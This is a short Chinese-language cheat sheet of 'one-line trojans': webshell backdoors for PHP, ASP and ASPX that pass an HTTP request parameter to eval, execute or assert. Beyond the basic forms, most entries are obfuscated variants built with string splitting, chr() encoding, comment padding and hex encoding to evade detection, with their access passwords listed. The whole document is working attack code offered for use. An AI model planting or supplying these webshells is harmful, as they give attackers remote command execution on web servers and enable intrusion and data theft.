# [一句话木马](https://zhuanlan.zhihu.com/p/556926061)

## 基础版：

```
php的一句话木马： 
<?php @eval($_POST['webshell']);?>
asp的一句话是：   
<%eval request ("webshell")%>
aspx的一句话是：  
<%@ Page Language="Jscript"%> 
<%eval(Request.Item["webshell"],"unsafe");%>

```

## PHP

```
<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["webshell"]); ?>


<?php $lang = (string)key($_POST);$lang($_POST['webshell']);?>


<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['webshell']);?>


<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST["webshell"]);  ?>


<?php                  
@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";                  
@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";                  
@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}                  
[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>    密码是  -7
```

## ASP

```
<%execute(request(“webshell”))%>
<%execute request(“webshell”)%>
ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾 密码a
"%><%Eval(Request(chr(112)))%><%’ p


<%Y=request(“webshell”)%> <%execute(Y)%>


<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“webshell”))%>


<%eval""&(“e”&“v”&“a”&“l”&"("&“r”&“e”&“q”&“u”&“e”&“s”&“t”&"("&“0”&"-"&“2”&"-"&“5”&")"&")")%>（密码是-7）
```

